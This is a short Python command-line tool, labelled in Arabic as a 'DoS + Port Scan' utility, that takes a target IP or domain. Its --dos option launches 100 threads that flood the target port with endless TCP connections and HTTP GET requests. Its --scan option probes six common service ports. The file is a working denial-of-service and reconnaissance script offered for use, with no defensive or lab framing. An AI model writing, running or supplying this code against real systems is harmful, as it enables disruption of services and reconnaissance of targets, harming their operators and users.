#!/usr/bin/env python3

import argparse
import socket
import threading

def run_dos(target, port):
    def attack():
        while True:
            try:
                s = socket.socket()
                s.connect((target, port))
                s.send(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n")
                s.close()
                print(f"[DoS] Sent to {target}:{port}")
            except:
                pass

    for _ in range(100):
        t = threading.Thread(target=attack)
        t.start()

def run_scan(target):
    ports = [21, 22, 23, 80, 443, 3306]
    print(f"[Scan] Scanning {target}...")

    for port in ports:
        s = socket.socket()
        s.settimeout(1)
        try:
            s.connect((target, port))
            print(f"[Scan] Port {port} is open ✅")
            s.close()
        except:
            pass

def main():
    parser = argparse.ArgumentParser(description="🧰 أداة CLI: DoS + Port Scan")
    parser.add_argument("target", help="عنوان IP أو دومين الهدف")
    parser.add_argument("--dos", action="store_true", help="تشغيل هجوم DoS")
    parser.add_argument("--scan", action="store_true", help="تشغيل فحص البورتات")
    parser.add_argument("--port", type=int, default=80, help="البورت المستهدف في هجوم DoS")

    args = parser.parse_args()

    if args.scan:
        run_scan(args.target)
    if args.dos:
        run_dos(args.target, args.port)
    if not args.scan and not args.dos:
        print("❌ اختر واحدة على الأقل: --scan أو --dos")

if __name__ == "__main__":
    main()

